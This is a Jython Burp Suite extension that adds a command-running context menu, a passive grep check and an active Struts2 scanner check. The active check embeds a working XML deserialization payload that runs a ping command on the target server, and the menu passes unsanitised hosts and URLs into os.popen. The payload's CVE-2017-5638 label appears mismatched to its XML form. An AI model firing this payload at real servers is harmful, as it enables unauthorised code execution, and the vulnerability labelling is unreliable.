# -*- coding:utf-8 -*-
# Title:BurpSuite插件、Jpython
# 扫描器和菜单实现
try:
    import os
    import sys
    import json
    import thread
    import traceback
    import inspect
    # 导入 burp 接口
    from burp import IBurpExtender,IContextMenuFactory,IScannerCheck, IScanIssue
    from array import array
    from javax.swing import JMenu
    from javax.swing import JMenuItem
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."

# 基本信息和设置
VERSION = "1.0.0"
helpers = None
callbacks = None
extension_enable = False
DEBUG=True

# scanser配置信息
GREP_STRING = "JSP/ServerJest"   #passsive 特征字符串
GREP_STRING_BYTES = bytearray(GREP_STRING)

# 调试辅助方法开始   get_current_function_name() 返回最后一次调用的方法名
def get_current_function_name():
    return inspect.stack()[1][3]

def execCommand(command):
    print  command
    try:
        print u'[I] 正在执行命令: {command}, 请稍后...'.format(command=command)
        res = u'---------- 命令 {command} 执行结果: ---------- {res}'.format(command=command, res=os.popen(command).read())
        print res
    except:
        print traceback.print_exc()
def request(basePair, insertionPoint, attack):
    req = insertionPoint.buildRequest(attack)
    #这里可以再接受一个参数设置请求方法(GET post options等)
    return callbacks.makeHttpRequest(basePair.getHttpService(), req)
def setHeader(request, name, value, add_if_not_present=False):
    # find the end of the headers
    prev = ''
    i = 0
    while i < len(request):
        this = request[i]
        if prev == '\n' and this == '\n':
            break
        if prev == '\r' and this == '\n' and request[i - 2] == '\n':
            break
        prev = this
        i += 1
    body_start = i

    # walk over the headers and change as appropriate
    headers = safe_bytes_to_string(request[0:body_start])
    headers = headers.splitlines()
    modified = False
    for (i, header) in enumerate(headers):
        value_start = header.find(': ')
        header_name = header[0:value_start]
        if header_name == name:
            new_value = header_name + ': ' + value
            if new_value != headers[i]:
                headers[i] = new_value
                modified = True

    # stitch the request back together
    if modified:
        modified_request = helpers.stringToBytes('\r\n'.join(headers) + '\r\n') + request[body_start:]
    elif add_if_not_present:
        # probably doesn't work with POST requests
        real_start = helpers.analyzeRequest(request).getBodyOffset()
        modified_request = request[:real_start-2] + helpers.stringToBytes(name + ': ' + value + '\r\n\r\n') + request[real_start:]
    else:
        modified_request = request

    return modified, modified_request
def safe_bytes_to_string(bytes):
    if bytes is None:
        bytes = ''
    return helpers.bytesToString(bytes)
def debug_msg(message):
    if DEBUG:
        print message
# 设置编码
reload(sys)
sys.setdefaultencoding('utf-8')


# 注册要调用的接口,要使用的接口在这里进行注册,不在入口注册也可以在callbacks中调用其他类,然后在类入口调用
class BurpExtender(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks, helpers
        self.messages = []
        self.menusConf = {}
        callbacks = this_callbacks

        # 辅助功能IExtensionHelpers , 调用 IBurpExtenderCallbacks.getHelpers获得此接口实例，
        # 其中analyzeRequest和analyzeResponse是最常用的两个方法
        helpers = callbacks.getHelpers()

        # alert 信息
        callbacks.issueAlert('test ready ...')

        # 设置扩展选项卡中显示的扩展名
        callbacks.setExtensionName('Jpython-test')

        # 自定义右击菜单：callbacks.registerContextMenuFactory(self) 注册自定义上下文菜单项的工厂
        # 当用户在Burp中的任何地方调用一个上下文菜单时，Burp则会调用这个工厂方法。此方法会根据菜单调用的细节，提供应该被显示在上下文菜单中的任何自定义上下文菜单项。
        callbacks.registerContextMenuFactory(self)  # -> createMenuItems()

        # 自定义扫描器
        callbacks.registerScannerCheck(Myscan())  # 注册其他扫描类 Myscan(IScannerCheck)

        # output
        print 'hello burp!'
        print 'line:' + str(sys._getframe().f_lineno) + ' *//: ' + '%s.%s' % (
        self.__class__.__name__, get_current_function_name())
        print "Successfully loaded myjpython pro v" + VERSION

        # invocation(IContextMenuInvocation) 用于获取当 Burp 调用扩展提供的 IContextMenuFactory 工厂里的上下文菜单时的一些细节
    def createMenuItems(self, invocation):
        # 将加载的过程放在 createMenuItems 接口方法中 可以在不重新加载该插件的情况下，动态加载配置
        self.loadMenus()  # 加载配置文件

        # invocation.getInputEvent() #input 此方法可被用于获取本地Java输入事件，并作为上下文菜单调用的触发器
        # invocation.getInvocationContext()# byte 此方法被用于获取上下文中被调用的菜单
        # invocation.getSelectedIssues() #[]  此方法被用于获取用户选中的 Scanner 问题的细节
        # invocation.getSelectionBounds()#int[] 此方法被用于获取用户所选的当前消息的界限（消息需可适用）
        # invocation.getToolFlag()#int  此方法被用于获取调用上下文菜单的Burp工具target / proxy / repeater...
        self.messages = invocation.getSelectedMessages()  # IHttpRequestResponse[] 此方法被用于获取当前显示的或用户选中的 HTTP请求 / 响应的细节

        # 只在指定的 Burp 标签的右键菜单显示
        # ctx = invocation.getInvocationContext()
        # print 'line:'+ str(sys._getframe().f_lineno)+'  *//:'+ str(ctx)
        # print 'line:'+ str(sys._getframe().f_lineno)+'  *//:'+  str( invocation.getToolFlag())
        # if not ctx in [0, 1, 2, 3, 4, 5, 6]:
        #     return None
        return self.menus if self.menus else None

    # 加载右键菜单配置
    def loadMenus(self):
        self.menus = []
        self.mainMenu = JMenu(u"外部程序交互")
        self.menus.append(self.mainMenu)
        try:
            with open('json.conf') as fp:
                self.menusConf = json.loads(fp.read())
        except:
            self.mainMenu.add(JMenuItem(u'加载配置出错!'))
            print u'加载配置出错!'
        else:
            for tool in self.menusConf:
                # 遍历配置，创建子菜单项，并添加事件绑定
                menu = JMenuItem(tool['name'],
                                 None,
                                 actionPerformed=lambda x: self.eventHandler(x))
                self.mainMenu.add(menu)

    def eventHandler(self, x):
        '''通过获取当前点击的子菜单的 text 属性，确定当前需要执行的 command 启动线程执行命令'''
        try:

            menuName = x.getSource().text

            for tool in self.menusConf:
                # print tool['name']
                # print menuName

                if tool['name'] == menuName:
                    commands = [tool['command'].replace(
                        '{#}', val) for val in self.getValue(tool['param'])]
                    [thread.start_new_thread(execCommand, (command,))
                     for command in commands]
                    # print  u"命令:",commands
        except BaseException, e:
            print e
            print traceback.print_exc()

    def getHost(self, message):
        return message.getHttpService().getHost()

    # 获取 Url 注意此处若通过 meesage.getRequest() 是获取不到的
    def getUrl(self, meesage):
        return str(helpers.analyzeRequest(meesage).getUrl())

    # 通过json.conf配置中的 参数值 分别获取不同值
    def getValue(self, paramType):
        # 获取数据包中host
        if paramType == 'host':
            return set([self.getHost(message) for message in self.messages])
        # 获取数据包中url
        elif paramType == 'url':
            return set([self.getUrl(message) for message in self.messages])
        else:
            return ' '
#
# class implementing IScanIssue to hold our custom scan issue details
# 类实现IScanIssue以保存自定义扫描问题详细信息
#
# IScanIssue 此接口用于获取 Scanner 工具扫描到的问题的细节  http://www.vuln.cn/6099
#
class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence,severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
        self._Confidence=confidence


    # 此方法返回生成扫描问题对应的 URL 信息
    def getUrl(self):
        return self._url

    # 此方法返回扫描问题类型的名称
    def getIssueName(self):
        return self._name

    # 此方法返回扫描问题类型的数字标志符
    def getIssueType(self):
        return 0

    # 此方法返回扫描问题的错误等级
    def getSeverity(self):
        return self._severity

    # 此方法返回扫描问题的信任等级
    def getConfidence(self):
        return self._Confidence

    # 此方法返回指定扫描问题类型的背景描述信息
    def getIssueBackground(self):
        pass

    # 此方法返回指定扫描问题的解决方式的背景描述信息
    def getRemediationBackground(self):
        pass

    # 此方法返回指定的扫描问题的详细信息
    def getIssueDetail(self):
        return self._detail

    # 此方法返回指定扫描问题的解决方式的背景详情
    def getRemediationDetail(self):
        pass

    # 此方法返回生成扫描问题所对应的 HTTP 消息
    def getHttpMessages(self):
        return self._httpMessages

    # 此方法返回指定扫描问题类型的背景描述信息
    def getHttpService(self):
        return self._httpService


# 参考 http://www.vuln.cn/6098

# 扫描类
#
# IScannerCheck Burp 将会告知检查器执行“主动扫描”或“被动扫描”，并且在确认扫描到问题时给出报告。
#
class Myscan(IScannerCheck):
    """docstring for ClassName"""

    def _get_matches(self, response, match):    #匹配响应特征
        matches = []
        start = 0
        reslen = len(response)
        matchlen = len(match)
        while start < reslen:
            start = helpers.indexOf(response, match, True, start, reslen)
            if start == -1:
                break
            matches.append(array('i', [start, start + matchlen]))
            start += matchlen
        return matches

    #
    # implement IScannerCheck
    #https://portswigger.net/burp/extender/api/index.html 官方参数说明
    def doPassiveScan(self, baseRequestResponse):
        # print dir(self)
        # print dir(baseRequestResponse)
        # look for matches of our passive check grep string
        matches = self._get_matches(baseRequestResponse.getResponse(), GREP_STRING_BYTES)
        # print matches
        # print type(matches)
        if (len(matches) == 0):
            return None
        # report the issue
        return [CustomScanIssue(
            baseRequestResponse.getHttpService(),
            helpers.analyzeRequest(baseRequestResponse).getUrl(),
            [callbacks.applyMarkers(baseRequestResponse, None, matches)],
            "PassiveScan Test O!P! Find:"+GREP_STRING,                             # 标题
            "The response contains the string: " + GREP_STRING,  # 详细信息
            "Certain",                                           # 信任等级
            "High")]                                             # 影响级别

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        if 'Referer' != insertionPoint.getInsertionPointName():   #只发起一次请求
            return []
        collab = callbacks.createBurpCollaboratorClientContext()  #设置监听器（监听ping包icmp DNS）
        collab_payload = collab.generatePayload(True)             #请求的地址
        print  collab_payload

        # s2-045 payload
        param_pre ='''<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command><string>cmd</string><string>/c</string><string></string><string>'''
        param_post ='''</string></command><redirectErrorStream>false</redirectErrorStream></next></iter><filter class="javax.imageio.ImageIO$ContainsFilter"><method><class>java.lang.ProcessBuilder</class><name>start</name><parameter-types/></method><name>foo</name></filter><next class="string">foo</next></serviceIterator><lock/></cipher><input class="java.lang.ProcessBuilder$NullInputStream"/><ibuffer/><done>false</done><ostart>0</ostart>
<ofinish>0</ofinish><closed>false</closed></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/><jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/></entry> </map>'''

        command = "ping " + collab_payload + " -c1"  # 通过DNS交互检查该RCE漏洞,
        # command = "calc"
        attack_param = param_pre + command + param_post

        #设置请求头
        (ignore, req) = setHeader(baseRequestResponse.getRequest(), 'Content-Type', "application/xml",True)
        (ignore, req) = setHeader(req, 'Content-Length', str(len(attack_param)), True)

        #插入payload到请求中
        for chars in attack_param:
            req.append(ord(chars))

        #set POST
        if req[0] == 71:  # if the reqest starts with G(ET)  请求开始位置是G开头（GET）则替换为POST
            req = req[3:]  # trim GET
            i = 0
            for b in [80, 79, 83, 84]:  # and insert POST
                req.insert(i, b)
                i += 1

        attack = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), req)  #发起自定义构造的post请求 没有经过insertionPoint构造
        #attack = request(baseRequestResponse, insertionPoint, attack_param)  #使用insertionPoint插入payload发起请求

        debug_msg(helpers.analyzeRequest(attack).getUrl())
        interactions = collab.fetchAllCollaboratorInteractions()  # Check for collaboration  检测流量交互
        debug_msg(interactions)
        if interactions:
            return [CustomScanIssue(
                baseRequestResponse.getHttpService(),
                helpers.analyzeRequest(baseRequestResponse).getUrl(), [attack],
                "Struts2 CVE-2017-5638 RCE (s2-045)",  # 标题
                "The application appears to be vulnerable to CVE-2017-5638, enabling arbitrary code execution.payload:" + attack_param+'<br/><br/>collaboration:<b>'+str(interactions)+'</b>',  # 详细信息
                "Certain",                               #信任等级 firm
                "High")]

    # 当自定义的Scanner工具的检查器针对同一个 URL 路径报告了多个扫描问题时，Scanner 工具会调用此方法,将同链接归为一个组
    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        # This method is called when multiple issues are reported for the same URL
        # path by the same extension-provided check. The value we return from this
        # method determines how/whether Burp consolidates the multiple issues
        # to prevent duplication
        #
        # Since the issue name is sufficient to identify our issues as different,
        # if both issues have the same name, only report the existing issue
        # otherwise report both issues
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1
        return 0

